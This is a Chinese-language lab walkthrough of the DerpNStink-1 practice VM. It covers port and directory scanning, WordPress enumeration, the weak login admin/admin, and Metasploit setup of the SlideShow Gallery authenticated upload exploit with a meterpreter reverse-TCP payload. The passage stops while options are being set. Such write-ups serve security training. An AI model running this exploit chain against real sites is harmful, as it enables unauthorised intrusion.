---
title: Derpnstink-1
date: 2024年7月22日
updated: 2024年7月22日
tags:
  - 靶场
categories: 靶场
keywords:
description: Derpnstink-1
---
## Derpnstink-1

上来就是经典的扫描环节来进行信息收集
```
┌──(kali㉿kali)-[~]
└─$ nmap -sP 192.168.159.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 15:45 CST
Nmap scan report for 192.168.159.1
Host is up (0.00023s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.159.2
Host is up (0.00026s latency).
MAC Address: 00:50:56:E1:64:0A (VMware)
Nmap scan report for 192.168.159.136
Host is up (0.0010s latency).
MAC Address: 00:0C:29:CA:2C:FC (VMware)
Nmap scan report for 192.168.159.254
Host is up (0.00014s latency).
MAC Address: 00:50:56:E9:DF:17 (VMware)
Nmap scan report for 192.168.159.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 6.11 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.159.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 15:46 CST
Nmap scan report for 192.168.159.136
Host is up (0.00094s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
MAC Address: 00:0C:29:CA:2C:FC (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 192.168.159.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.30 seconds
```
开放了21，22，80端口，先访问一下看看

[![pk76XnK.png](https://s21.ax1x.com/2024/07/22/pk76XnK.png)](https://imgse.com/i/pk76XnK)

查看源码获得
```第一个flag
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
```

并且在webnote/info中提示要配置dns
```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->

```

扫描一下后台看看
```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.159.136/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Jul 22 15:55:12 2024
URL_BASE: http://192.168.159.136/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.159.136/ ----
==> DIRECTORY: http://192.168.159.136/css/
+ http://192.168.159.136/index.html (CODE:200|SIZE:1298)
==> DIRECTORY: http://192.168.159.136/javascript/
==> DIRECTORY: http://192.168.159.136/js/
==> DIRECTORY: http://192.168.159.136/php/
+ http://192.168.159.136/robots.txt (CODE:200|SIZE:53)
+ http://192.168.159.136/server-status (CODE:403|SIZE:295)
==> DIRECTORY: http://192.168.159.136/temporary/
==> DIRECTORY: http://192.168.159.136/weblog/

---- Entering directory: http://192.168.159.136/css/ ----

---- Entering directory: http://192.168.159.136/javascript/ ----
==> DIRECTORY: http://192.168.159.136/javascript/jquery/

---- Entering directory: http://192.168.159.136/js/ ----

---- Entering directory: http://192.168.159.136/php/ ----
+ http://192.168.159.136/php/info.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/

---- Entering directory: http://192.168.159.136/temporary/ ----
+ http://192.168.159.136/temporary/index.html (CODE:200|SIZE:12)

---- Entering directory: http://192.168.159.136/weblog/ ----
+ http://192.168.159.136/weblog/index.php (CODE:200|SIZE:15372)
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/
==> DIRECTORY: http://192.168.159.136/weblog/wp-content/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/
+ http://192.168.159.136/weblog/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://192.168.159.136/javascript/jquery/ ----
+ http://192.168.159.136/javascript/jquery/jquery (CODE:200|SIZE:252879)
+ http://192.168.159.136/javascript/jquery/version (CODE:200|SIZE:5)

---- Entering directory: http://192.168.159.136/php/phpmyadmin/ ----
+ http://192.168.159.136/php/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
+ http://192.168.159.136/php/phpmyadmin/index.php (CODE:200|SIZE:8268)
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/js/
+ http://192.168.159.136/php/phpmyadmin/libraries (CODE:403|SIZE:306)
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/
+ http://192.168.159.136/php/phpmyadmin/phpinfo.php (CODE:200|SIZE:8270)
+ http://192.168.159.136/php/phpmyadmin/setup (CODE:401|SIZE:461)
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/

---- Entering directory: http://192.168.159.136/weblog/wp-admin/ ----
+ http://192.168.159.136/weblog/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/css/
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/images/
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/includes/
+ http://192.168.159.136/weblog/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/js/
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/maint/
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/network/
==> DIRECTORY: http://192.168.159.136/weblog/wp-admin/user/

---- Entering directory: http://192.168.159.136/weblog/wp-content/ ----
+ http://192.168.159.136/weblog/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.159.136/weblog/wp-content/plugins/
==> DIRECTORY: http://192.168.159.136/weblog/wp-content/themes/
==> DIRECTORY: http://192.168.159.136/weblog/wp-content/upgrade/
==> DIRECTORY: http://192.168.159.136/weblog/wp-content/uploads/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/certificates/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/css/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/customize/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/fonts/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/widgets/

---- Entering directory: http://192.168.159.136/php/phpmyadmin/js/ ----
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/js/jquery/

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ ----
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ar/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/bg/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ca/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/cs/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/da/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/de/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/el/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/es/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/et/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/fi/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/fr/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/gl/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hi/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hr/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/hu/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/id/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/it/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ja/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ko/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/lt/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/nl/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pl/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pt/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/pt_BR/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ro/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/ru/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/si/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sk/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sl/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/sv/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/th/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/tr/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/uk/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/zh_CN/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/locale/zh_TW/

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/ ----
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/

---- Entering directory: http://192.168.159.136/weblog/wp-admin/css/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-admin/images/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-admin/includes/ ----
+ http://192.168.159.136/weblog/wp-admin/includes/admin.php (CODE:500|SIZE:0)

---- Entering directory: http://192.168.159.136/weblog/wp-admin/js/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-admin/maint/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-admin/network/ ----
+ http://192.168.159.136/weblog/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://192.168.159.136/weblog/wp-admin/network/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.159.136/weblog/wp-admin/user/ ----
+ http://192.168.159.136/weblog/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://192.168.159.136/weblog/wp-admin/user/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.159.136/weblog/wp-content/plugins/ ----
+ http://192.168.159.136/weblog/wp-content/plugins/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.159.136/weblog/wp-content/themes/ ----
+ http://192.168.159.136/weblog/wp-content/themes/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.159.136/weblog/wp-content/upgrade/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-content/uploads/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/certificates/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/css/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/customize/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/fonts/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/media/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/images/smilies/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/jquery/
+ http://192.168.159.136/weblog/wp-includes/js/swfobject.js (CODE:200|SIZE:10231)
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/thickbox/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/widgets/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/js/jquery/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ar/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/bg/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ca/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/cs/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/da/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/de/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/el/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/es/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/et/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/fi/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/fr/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/gl/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hi/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hr/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/hu/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/id/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/it/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ja/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ko/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/lt/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/nl/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pl/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pt/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/pt_BR/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ro/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/ru/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/si/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sk/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sl/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/sv/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/th/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/tr/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/uk/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/zh_CN/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/locale/zh_TW/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/css/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/img/
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/media/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/images/smilies/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/jquery/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/jquery/ui/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/thickbox/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/langs/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/themes/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/utils/

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/css/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/img/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/images/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/jquery/ui/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/langs/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/hr/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/image/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/lists/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/media/
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/wordpress/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/themes/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/utils/ ----

---- Entering directory: http://192.168.159.136/php/phpmyadmin/themes/original/jquery/images/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/hr/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/image/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/lists/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/media/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/plugins/wordpress/ ----

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/ ----
==> DIRECTORY: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/images/

---- Entering directory: http://192.168.159.136/weblog/wp-includes/js/tinymce/skins/wordpress/images/ ----
                                                                               ss/images/zt
-----------------
END_TIME: Mon Jul 22 16:00:33 2024
DOWNLOADED: 424304 - FOUND: 25
```
有一个```/weblog/```,但是我们访问的时候就变成了
```http://derpnstink.local/weblog/```,所以说dns应该改成

192.168.159.136  derpnstink.local

~~hosts在 /etc/hosts~~


访问扫描出来的各个后台，
```
http://derpnstink.local/php/phpmyadmin/
```
是一个phpmyadmin,试了试弱口令没进去，先放一下

```
http://derpnstink.local/weblog/wp-login

```
在这里有一个wordpress的登陆界面，经过测试发现存在admin/admin

因为是wordpress的建站，所以我们用他wpscan打一下
```
──(kali㉿kali)-[~]
└─$ wpscan --url http://derpnstink.local/weblog/

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://derpnstink.local/weblog/ [192.168.159.136]
[+] Started: Mon Jul 22 17:34:51 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.29 identified (Outdated, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: '-release.min.js?ver=4.6.29'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.29'

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.29, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2024-06-11T19:04:00.000Z
 | [!] The version is out of date, the latest version is 1.8.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.4.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jul 22 17:34:59 2024
[+] Requests Done: 182
[+] Cached Requests: 5
[+] Data Sent: 48.098 KB
[+] Data Received: 13.151 MB
[+] Memory used: 288.371 MB
[+] Elapsed time: 00:00:07
```
存在slideshow-gallery漏洞，我们用msf搜一下

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Use sessions -1 to interact with the last opened session

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.4.17-dev                          ]
+ -- --=[ 2436 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search Slidehow Gallery
[-] No results from search
msf6 > search slidehow
[-] No results from search
```
都没有，看另外一个wp说是有一个cve-2014-5406的，尝试利用

```
msf6 > search CVE-2014-5460

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_slideshowgallery_upload  2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_slideshowgallery_upload

```

```
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set rhosts 192.168.159.136
rhosts => 192.168.159.136
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host
                                           :port][...]
   RHOSTS       192.168.159.136  yes       The target host(s), see https://docs.metasploit.c
                                           om/docs/using-metasploit/basics/using-metasploit.
                                           html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       The base path to the wordpress application
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD                   yes       Valid password for the provided username
   WP_USER                       yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin
wp_user => admin
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > ser WP_PASSWORD admin
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show option
[-] Invalid parameter "option", use "show -h" for more information
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host
                                           :port][...]
   RHOSTS       192.168.159.136  yes       The target host(s), see https://docs.metasploit.c
                                           om/docs/using-metasploit/basics/using-metasploit.
                                           html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       The base path to the wordpress application
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD                   yes       Valid password for the provided username
   WP_USER      admin            yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_password admin
wp_password => admin
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set targeturl /weblog
[!] Unknown datastore option: targeturl. Did you mean TARGET?
targeturl => /weblog
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set vhost derpanstink.local
vhost => derpanstink.local
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set vhost derpnstink.local
vhost => derpnstink.local
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set targeturl /weblog/
targeturl => /weblog/
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:hos
                                            t:port][...]
   RHOSTS       192.168.159.136   yes       The target host(s), see https://docs.metasploit.
                                            com/docs/using-metasploit/basics/using-metasploi
                                            t.html
   RPORT        80                yes       The target port (TCP)
   SSL          false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                 yes       The base path to the wordpress application
   VHOST        derpnstink.local  no        HTTP server virtual host
   WP_PASSWORD  admin             yes       Valid password for the provided username
   WP_USER      admin             yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set TARGETURL /weblog/
TARGETURL => /weblog/
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > SHOW OPTIONS
[-] Unknown command: SHOW. Did you mean show? Run the help command for more details.
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:hos
                                            t:port][...]
   RHOSTS       192.168.159.136   yes       The target host(s), see https://docs.metasploit.
                                            com/docs/using-metasploit/basics/using-metasploi
                                            t.html
   RPORT        80                yes       The target port (TCP)
   SSL          false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                 yes       The base path to the wordpress application
   VHOST        derpnstink.local  no        HTTP server virtual host
   WP_PASSWORD  admin             yes       Valid password for the provided username
   WP_USER      admin             yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

